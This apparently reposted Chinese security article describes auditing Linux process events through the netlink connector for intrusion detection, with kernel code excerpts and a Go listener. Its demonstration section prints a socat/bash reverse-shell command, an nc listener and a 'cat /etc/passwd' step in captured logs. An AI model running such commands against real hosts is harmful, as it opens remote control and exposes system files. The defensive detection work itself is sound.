> 原文链接: https://www.anquanke.com//post/id/250050 


# 基于Linux连接器的审计进程事件实现方案


                                阅读量   
                                **25440**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0143ff34518974eda3.jpg)](https://p5.ssl.qhimg.com/t0143ff34518974eda3.jpg)



## 1 引言

主机安全是信息安全纵深防御体系中最贴近业务的安全组件，离得近，看得清，能够及时感知入侵行为。攻击者的绝大多数攻击行为都是以进程的方式呈现，攻击者执行命令控制操作产生进程，进程发起网络连接请求传输数据，并可能产生文件读写行为。从进程的角度出发关联出命令执行、网络连接、读写文件，可以快速分析出大量安全攻击场景，还原出入侵行为攻击的链路。因此审计进程事件在反入侵检测中是最重要安全感知数据，是安全检测和异常分析的基础。这样不论在攻击事前的弱口令扫描或暴力破解动作；还是事中的反弹 Shell、命令执行注入；事后的后门或隐藏进程，都可以依赖进程事件的基础数据分析，结合不同的攻击向量，多维度快速检测分析出攻击行为。

在常见的进程事件数据采集方案包括两种，第一种内核模块 Hook，拦截系统调用符号表 sys_call_table地址，hook fork、exec、connect等系统调用地址更改成内核模块中自定义函数地址，优点：能抓取全量进程事件，不易被绕过；缺点：方案过重，侵入内核，主机风险较高，需要兼容多个版本，稳定性低。第二种利用 Linux 动态库 preload 机制，拦截 libc 同名 fork、exec 族函数，优先加载 hook 动态库自实现同名函数，优点：方案轻量，实现简单；缺点：侵入到主机所有进程，与业务耦合，稳定性低，并且对静态链接程序失效，会遗漏进程事件。

本文提供第三种方案：通过 Linux 连接器 (netlink connector) 实现进程事件审计，由 Linux 内核提供的接口，安全可靠，结合用户态轻量级 ncp 自实现应用程序，抓取全量进程事件，能够覆盖更多安全检测场景，并对主机影响面较小。



## 2 实现方案

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0153701d7a6dc1087e.png)

1、linux内核提供连接器模块与进程事件收集机制，无需任何改动

2、在用户态实现轻量级ncp(netlink connector process)应用程序接收netlink进程事件消息



## 3 linux连接器

连接器是一种netlink通信，用以实现用户进程与内核进程通信的一种特殊的进程间通信( IPC )， 连接器最常见应用是进程事件连接器。

linux内核从2.6.15版本开始支持连接器，可以检查内核模块配置文件(例 /boot/config-3.10.0-327.36.3.el7.x86_64 )是否配置CONFIG_CONNECTOR，CONFIG_PROC_EVENTS确定。

```
CONFIG_CONNECTOR=y

CONFIG_PROC_EVENTS=y
```

### <a class="reference-link" name="3.1%20%E8%BF%9E%E6%8E%A5%E5%99%A8%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"></a>3.1 连接器内核模块

连接器内核模块实现核心代码主要在:

driver/connector/connector.c,driver/connector/cn_queue.c

```
int cn_add_callback(struct cb_id *id, const char *name,

            void (*callback)(struct cn_msg *,

                     struct netlink_skb_parms *))



void cn_del_callback(struct cb_id *id)
```

cn_add_callback:用于向连接器注册新的连接器实例以及相应的回调函数，参数id 指定注册的标识 ID，参数 name 指定连接器回调函数的符号名，参数 callback 为回调函数。

连接器模块注册了”cn_proc”的连接器实例,并设置 cn_proc_mcast_ctl 回调函数

```
cn_add_callback(&amp;cn_proc_event_id,

                  "cn_proc",

                  &amp;cn_proc_mcast_ctl)



static void cn_proc_mcast_ctl(struct cn_msg *msg,

                  struct netlink_skb_parms *nsp)`{`

        *

        mc_op = (enum proc_cn_mcast_op *)msg-&gt;data;

        switch (*mc_op) `{`

        case PROC_CN_MCAST_LISTEN:

            atomic_inc(&amp;proc_event_num_listeners);

            break;

        case PROC_CN_MCAST_IGNORE:

            atomic_dec(&amp;proc_event_num_listeners);

            break;

        default:

            err = EINVAL;

            break;

        `}`

        *

`}`
```

cn_proc_mcast_ctl:接收通过连接器通道发来的用户态消息，主要处理PROC_CN_MCAST_LISTEN，PROC_CN_MCAST_IGNORE两种控制消息。

### <a class="reference-link" name="3.2%20%E8%BF%9B%E7%A8%8B%E4%BA%8B%E4%BB%B6"></a>3.2 进程事件

进程事件连接器的实现代码主要在

drivers/connector/cn_proc.c

```
int cn_netlink_send(struct cn_msg *msg, u32 __group, gfp_t gfp_mask)

```

cn_netlink_send：用于向用户态发送 netlink 消息，参数 msg 为发送的 netlink 消息的消息头。

在内核实现中，进程创建、执行、退出的系统调用sys_fork, sys_exec,sys_exit最终都会通过cn_netlink_send发送消息到用户态.

```
sys_fork-&gt;do_fork-&gt;copy_process-&gt;proc_fork_connector-&gt;cn_netlink_send



sys_exec-&gt;do_execve-&gt;do_execve_common-&gt;search_binary_handler-&gt;proc_exec_connector-&gt;cn_netlink_send



sys_exit-&gt;do_exit-&gt;proc_exit_connector-&gt;cn_netlink_send
```

在 proc_fork_connector、proc_exec_connector、proc_exit_connector 都是从内核进程数据结构task_struct获取信息封装netlink消息。

```
void proc_fork_connector(struct task_struct *task) `{`

    *

    ev-&gt;what = PROC_EVENT_FORK;

    parent = rcu_dereference(task-&gt;real_parent);

    ev-&gt;event_data.fork.parent_pid = parent-&gt;pid;

    ev-&gt;event_data.fork.parent_tgid = parent-&gt;tgid;

    ev-&gt;event_data.fork.child_pid = task-&gt;pid;

    ev-&gt;event_data.fork.child_tgid = task-&gt;tgid;

    *

`}`



void proc_exec_connector(struct task_struct *task)`{`

    *

    ev-&gt;what = PROC_EVENT_EXEC;

    ev-&gt;event_data.exec.process_pid = task-&gt;pid;

    ev-&gt;event_data.exec.process_tgid = task-&gt;tgid;

    *

`}`



void proc_exit_connector(struct task_struct *task)`{`

    *

    ev-&gt;what = PROC_EVENT_EXIT;

    ev-&gt;event_data.exit.process_pid = task-&gt;pid;

    ev-&gt;event_data.exit.process_tgid = task-&gt;tgid;

    ev-&gt;event_data.exit.exit_code = task-&gt;exit_code;

    ev-&gt;event_data.exit.exit_signal = task-&gt;exit_signal;

    *

`}`
```

proc_fork_connector消息中封装父进程pid、tgid和当前进程pid、tgid数据。

proc_exec_connector消息中封装当前进程pid、tgid数据。

proc_exit_connector消息中封装当前进程pid、tgid和exit_code、exit_signal数据。

除了上述三种事件，还有进程coredump、ptrace、id事件。

### <a class="reference-link" name="3.3%20netlink%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F"></a>3.3 netlink消息格式

对于进程事件连接器，内核发出的netlink消息包括 netlink消息头（netlink header）、连接器消息头（connector header）、控制操作或进程事件指令（control or process data）三部分，下图中各控制消息和进程事件消息格式。

```
netlink消息格式

* netlink header * connector header * control or process data *

|   idx---val    |  seq---ack---len |          data           |



控制事件数据

*    contorl event     *

|      flags--op       |



进程fork事件数据

*     fork event       *

| ptid--ppid--tid--pid |



进程exec事件数据

*     exec event       *

|       tid--pid       |



进程exit事件数据

*           exit event             *

| tid--pid--exit_code--exit_signal |
```



## 4 ncp用户态实现

ncp ( netlink connector process ) 实现分成四步：1）建立 netlink connector 连接，2）打开进程连接器开关 ，3）持续接收进程事件，4）解析进程数据。

### <a class="reference-link" name="4.1%20%E8%BF%9E%E6%8E%A5%E5%BB%BA%E7%AB%8B"></a>4.1 连接建立

```
fd, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_DGRAM, syscall.NETLINK_CONNECTOR)



lsa.Family = syscall.AF_NETLINK

lsa.Groups = C.CN_IDX_PROC



if err = syscall.Bind(fd, &amp;lsa); err != nil `{`

    syscall.Close(fd)

`}`
```

Socket: nl_family设置为 AF_NETLINK, proto设置为 NETLINK_CONNECTOR

Bind: 绑定地址family为AF_NETLINK, groups为CN_IDX_PROC

### <a class="reference-link" name="4.2%20%E6%89%93%E5%BC%80%E8%BF%9B%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%99%A8%E5%BC%80%E5%85%B3"></a>4.2 打开进程连接器开关

```
msg.idx = C.CN_IDX_PROC

    msg.val = C.CN_VAL_PROC

    msg.len = 4

    msg.op = C.PROC_CN_MCAST_LISTEN



    syscall.Sendto(fd, &amp;msg, 0, &amp;lca)
```

该步骤是构造一个netlink控制消息事件，通知内核模块打开进程连接器开关。

### <a class="reference-link" name="4.3%20%E6%8E%A5%E6%94%B6%E8%BF%9B%E7%A8%8B%E4%BA%8B%E4%BB%B6"></a>4.3 接收进程事件

```
for `{`

    nr, _, err := syscall.Recvfrom(self.fd, rb, 0)

    ev := parseEvent(nr)

    switch (ev）`{`

        case C.PROC_EVENT_FORK:

        *

            get_exe(pid)

            get_cmdline(pid)

            get_cwd(pid)

        *

        case C.PROC_EVENT_EXEC:

        *

        case C.PROC_EVENT_EXIT:

        *

    `}`

`}`
```

对于 fork、exec、exit 事件，内核都会输出进程pid和线程tid，应用层结合/proc/pid/目录, 可自动获取完善进程其他数据，如exe，cmdline，cwd等信息。

### <a class="reference-link" name="4.4%20%E8%BF%9B%E7%A8%8B%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BC%B9shell"></a>4.4 进程审计-反弹shell

以安全攻击中最常见的反弹shell 远程控制为测试案例：

操作步骤：1、在攻击主机（下图左侧终端）开启80端，nc -l4 80 。

2、在被攻击主机（下图右侧终端）通过socat、bash -i 连接攻击主机，实现反弹shell， 将shell 权限转交给攻击主机。

3、攻击主机执行pwd、cat /etc/passwd 可获取被攻击主机任意信息。

结果：ncp一共抓取五条进程事件(3条Exec，2条Fork)。

```
Exec: `{`tid:5860 pid:5860`}` -&gt; process exe:/usr/bin/socat, cmdline:socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:172.18.5.169:80, cwd:/home/root

Fork: `{`ptid:5860 ppid:5860 tid:5861 pid:5861`}` -&gt; process exe:/usr/bin/socat, cmdline:socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:192.168.10.12:80, cwd:/home/root

Exec: `{`tid:5861 pid:5861`}` -&gt; process exe:/usr/bin/bash, cmdline:bash -li, cwd:/home/cnptest

Fork: `{`ptid:5861 ppid:5861 tid:5918 pid:5918`}` -&gt; process exe:/usr/bin/bash, cmdline:bash -li, cwd:/home/root

Exec: `{`tid:5918 pid:5918`}` -&gt; process exe:/usr/bin/cat, cmdline:cat /etc/passwd, cwd:/home/root

```

[![](https://p5.ssl.qhimg.com/t01709f594a7041affa.png)](https://p5.ssl.qhimg.com/t01709f594a7041affa.png)

重点关注Exec事件

第一条Exec事件：在被攻击shell上执行socat exec命令产生进程(pid 5860), 进程详细信息: exe为/usr/bin/socat, cmdline参数:socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:192.168.10.12:80

第二条Exec事件：socat进程 fork出子进程 bash(pid 5861) ，执行bash -li操作, bash进程详细信息：exe:/usr/bin/bash, cmdline参数: bash -li

第三条Exec事件：bash进程再fork出子进程 cat(pid 5918), 执行cat /etc/passwd操作, cat进程详细信息：/usr/bin/cat, cmdline参数:cat /etc/passwd。

整个反弹shell进程树结构：

[![](https://p2.ssl.qhimg.com/t01b6c48d1199b00ac4.png)](https://p2.ssl.qhimg.com/t01b6c48d1199b00ac4.png)

在上述反弹shell方式中，依次产生socat进程事件、bash -i进程事件、cat 进程事件，通过进程的exe和cmdline信息可以快速检测入侵危险命令执行，结合父子进程pid，ppid等信息可以还原在攻击机器通过socat、bash -i等命令反弹shell远程控制，并盗取主机passwd文件的整个入侵过程。



## 5 结论

通过linux连接器结合轻量级用户态应用程序 ncp 能够实时审计 linux 进程事件，在此基础上采集进程proc目录下各维度信息，如 exe， cmdline，status，fd，stack 等，描绘出更详尽的进程轮廓，为主机安全反入侵检测提供重要数据支撑，实时抓取入侵攻击链路的异常动作，感知安全攻击行为。
